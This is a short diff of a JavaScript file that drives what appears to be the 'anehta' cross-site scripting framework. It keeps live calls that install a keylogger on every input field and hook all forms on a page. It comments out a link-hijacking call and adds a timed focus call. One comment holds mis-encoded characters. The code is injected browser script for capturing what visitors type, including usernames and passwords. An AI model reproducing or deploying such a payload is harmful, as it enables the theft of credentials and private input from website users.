@@ -17,15 +17,21 @@
 
 //setTimeout(function(){openWindow('/index.htm', 460, 460, '¹ºÂòÅ«Á¥');}, 1000);
 
+setTimeout(function(){
+	f_focus();	
+	}, 2000);
 
 
-
-anehta.trick.hijackLink(document.getElementById('ln'), "http://www.baidu.com");
+//anehta.trick.hijackLink(document.getElementById('ln'), "http://www.baidu.com");
 
 anehta.hook.installKeyloggerToAllInputs();
+//anehta.hook.installKeylogger(document.getElementById("username"), "blur");
 
 anehta.hook.hookAllForms();
 //anehta.hook.hookForm(document.getElementsByName("form1")[0]);
 
 
 //document.getElementsByName("username")[0].style.visibility  = "hidden";
+
+
+
